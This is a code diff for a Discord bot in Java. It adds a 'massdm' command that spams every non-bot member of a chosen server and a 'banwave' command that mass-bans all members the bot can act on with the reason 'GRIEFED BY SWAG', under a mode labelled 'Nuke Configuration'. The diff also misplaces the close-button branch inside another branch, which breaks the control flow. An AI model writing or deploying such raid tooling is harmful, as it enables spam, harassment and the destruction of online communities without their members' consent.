@@ -1,7 +1,11 @@
 package me.comu.exeter.core;
 
+import me.comu.exeter.logging.Logger;
+import me.comu.exeter.wrapper.Wrapper;
 import net.dv8tion.jda.api.entities.Guild;
 import net.dv8tion.jda.api.entities.Member;
+import net.dv8tion.jda.api.entities.User;
+import net.dv8tion.jda.api.requests.RestAction;
 
 import javax.swing.*;
 import javax.swing.border.TitledBorder;
@@ -127,6 +131,7 @@ class ConfigGUI
                 {
                     dispose();
                     LoginGUI.shouldRenderConfigurations = true;
+
                 }
             }
         });
@@ -216,21 +221,16 @@ class ConfigGUI
         setVisible(true);
     }
 
-    // method actionPerformed() 
-    // to get the action performed 
-    // by the user and act accordingly 
-    public void actionPerformed(ActionEvent e)
-    {
+
+    public void actionPerformed(ActionEvent e) {
         if (e.getSource() == sub) {
             String owner = "null";
             String guildID = "null";
             StringBuffer stringBuffer = new StringBuffer();
             int memberCount = 0;
-            for (Guild g : Core.jda.getGuilds())
-            {
-                if (g.getName() == serverBox.getSelectedItem().toString()){
-                    for (Member member : g.getMembers())
-                    {
+            for (Guild g : Core.jda.getGuilds()) {
+                if (g.getName() == serverBox.getSelectedItem().toString()) {
+                    for (Member member : g.getMembers()) {
                         memberCount++;
                         owner = g.getOwner().getUser().getName() + "#" + g.getOwner().getUser().getDiscriminator();
                         guildID = g.getId();
@@ -246,27 +246,53 @@ class ConfigGUI
                 else data1 = "Type: Nuke Configuration =)" + "\n";
 
 
-                String data2 = "Members: (" + memberCount + ")\n"+ stringBuffer.toString();
+                String data2 = "Members: (" + memberCount + ")\n" + stringBuffer.toString();
 
                 String data3 = "\nDebug CLI: " + tadd.getText();
                 tout.setText(data + data1 + data2 + data3);
                 tout.setEditable(false);
                 res.setText("Configuring...");
-            }
-            else {
-                tout.setText("");
-                resadd.setText("");
-                res.setText("Please accept the TOS");
-            }
-        }
+                if (tadd.getText().startsWith(";massdm")) {
+                    String message = tadd.getText().replaceFirst(";massdm", "");
+                    tadd.setText("");
+                    int memberSize = Core.jda.getGuildsByName(serverBox.getSelectedItem().toString(), true).get(0).getMemberCount();
+                    Thread massDM = new Thread(() -> {
+                        try {
+                            int counter = 0;
+                            for (Member member : Core.jda.getGuildsByName(serverBox.getSelectedItem().toString(), true).get(0).getMembers()) {
+                                if (!member.getUser().isBot()) {
+                                    member.getUser().openPrivateChannel().flatMap(privateChannel -> privateChannel.sendMessage(message)).queue(null, failure -> tadd.append(member.getUser().getAsTag() + " has their DMs disabled.\n"));
+                                    counter++;
+                                    tadd.append("Messaged " + member.getUser().getAsTag() + " (" + counter + ")\n");
+                                    Thread.sleep(2000);
+                                }
+                            }
+                        } catch (Exception exception) {
+                            tadd.setText("Caught Exception. HELP!\n");
+                        }
+                    });
+                    massDM.start();
+                    tadd.append(("Messaging " + memberSize + " users!\n"));
 
-        else if (e.getSource() == close) {
-            res.setText("null");
-            LoginGUI.shouldRenderConfigurations = true;
-            dispose();
+                } else if (tadd.getText().startsWith(";banwave")) {
+                    Guild guild = Core.jda.getGuildsByName(serverBox.getSelectedItem().toString(), true).get(0);
+                    {
+                        tadd.setText("Initiating Ban Wave... (" + guild.getMemberCount() + ")\n");
+                        guild.getMembers().stream().filter(member -> (member.getIdLong() != Core.OWNERID && !member.getId().equals(Core.jda.getSelfUser().getId()) && guild.getSelfMember().canInteract(member))).forEach(member -> member.ban(7, "GRIEFED BY SWAG").queue());
+                        tadd.append("Ban Wave Complete!");
+                    }
+                } else {
+                    tout.setText("");
+                    resadd.setText("");
+                    res.setText("Please accept the TOS");
+                }
+            } else if (e.getSource() == close) {
+                res.setText("null");
+                LoginGUI.shouldRenderConfigurations = true;
+                dispose();
+            }
         }
     }
-
 
 } 
   
